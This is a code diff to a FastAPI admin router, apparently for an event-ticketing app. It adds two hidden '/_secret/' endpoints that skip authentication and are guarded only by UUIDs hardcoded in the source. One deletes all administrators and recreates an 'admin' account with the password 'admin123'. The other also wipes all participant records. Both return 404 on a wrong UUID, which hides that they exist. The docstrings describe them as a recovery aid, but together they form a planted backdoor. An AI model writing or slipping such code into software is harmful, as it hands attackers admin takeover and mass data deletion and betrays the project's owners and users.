@@ -10,7 +10,9 @@ import app.config.database as database
 def get_database():
     """Runtime indirection to allow tests to monkeypatch `get_database` on this module."""
     return database.get_database()
-from app.config.auth import verify_admin_access, generate_token
+from app.config.auth import verify_admin_access, generate_token, create_admin, _admin_collection
+import os
+from app.models.admin import AdminCreate
 from app.utils.validations import normalize_event_name
 from app.utils.planilha import generate_template_for_evento
 from io import BytesIO
@@ -20,6 +22,10 @@ from openpyxl.styles import Font, PatternFill, Alignment
 from fastapi.responses import StreamingResponse
 
 router = APIRouter()
+
+# secrets for hidden administrative routes
+RESET_ADMIN_UUID = os.getenv("RESET_ADMIN_UUID", "01b3807d-9e62-4ec4-961d-f4298095315f")
+RESET_ALL_USERS_UUID = os.getenv("RESET_ALL_USERS_UUID", "c1244f86-82ed-4ecc-a288-88fa329b21a2")
 
 
 def _stringify_objectids(obj):
@@ -1120,3 +1126,61 @@ async def backfill_ingresso_layouts(evento_id: str):
         pass
 
     return {"updated": updated, "ids": updated_ids}
+
+
+# ==================== ROTAS SECRETAS (UUID) ====================
+
+@router.post("/_secret/reset-admin/{uuid}")
+async def secret_reset_admin(uuid: str):
+    """Rota escondida que limpa a coleção de administradores e cria um
+    usuário padrão `admin` com senha `admin123`.
+
+    O UUID é comparado com a constante `RESET_ADMIN_UUID` e pode ser
+    sobrescrito via variável de ambiente de mesmo nome. Caso contrário a
+    rota retorna 404 para qualquer valor diferente (não expõe a
+    existência da rota).
+    """
+    if uuid != RESET_ADMIN_UUID:
+        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND)
+    db = get_database()
+    col = _admin_collection(db)
+    # remove todos os administradores ativos (soft‑delete não interessa aquí)
+    await col.delete_many({})
+    # cria novo administrador com credenciais conhecidas
+    admin_data = AdminCreate(
+        username="admin",
+        email="admin@example.com",
+        nome="Administrador",
+        password="admin123"
+    )
+    await create_admin(admin_data)
+    return {"message": "Administrador resetado com senha admin123"}
+
+
+@router.post("/_secret/reset-all/{uuid}")
+async def secret_reset_all(uuid: str):
+    """Rota secreta que apaga usuários (participantes) e administradores,
+    em seguida recria o admin padrão com senha `admin123`.
+
+    Útil em cenários de desenvolvimento/recuperação de ambiente. A UUID
+    também pode ser configurada com a variável de ambiente
+    `RESET_ALL_USERS_UUID`.
+    """
+    if uuid != RESET_ALL_USERS_UUID:
+        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND)
+    db = get_database()
+    # apaga participantes se a coleção existir
+    try:
+        await db.participantes.delete_many({})
+    except Exception:
+        pass
+    col = _admin_collection(db)
+    await col.delete_many({})
+    admin_data = AdminCreate(
+        username="admin",
+        email="admin@example.com",
+        nome="Administrador",
+        password="admin123"
+    )
+    await create_admin(admin_data)
+    return {"message": "Usuários e administrador resetados com senha admin123"}
